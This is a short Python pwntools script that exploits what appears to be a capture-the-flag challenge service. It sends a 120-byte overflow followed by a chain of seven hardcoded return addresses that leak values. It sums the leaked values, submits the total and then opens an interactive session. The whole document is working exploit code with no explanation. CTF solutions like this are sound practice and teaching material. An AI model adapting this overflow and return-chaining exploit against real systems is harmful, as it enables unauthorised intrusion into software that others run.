from pwn import *

p = remote("0.0.0.0", 9032)

p.sendlineafter('Menu:', '1')

payload = 'A'*120
payload += p32(0x0809fe4b) # A
payload += p32(0x0809fe6a) # B
payload += p32(0x0809fe89) # C
payload += p32(0x0809fea8) # D
payload += p32(0x0809fec7) # E
payload += p32(0x0809fee6) # F
payload += p32(0x0809ff05) # G
payload += p32(0x0809fffc) # call ropme in main()

p.sendlineafter('? : ', payload)

sum = 0
for i in range(7):
        p.recvuntil('EXP +')
        exp_str = p.recvuntil(')')
        exp_str = exp_str[:-1]
        sum += int(exp_str)
        print "EXP: %s" % exp_str

print "SUM: %d" % sum

p.sendlineafter('Menu:', '1')
p.sendlineafter('? : ', str(sum))
p.interactive()
print p.recvall()
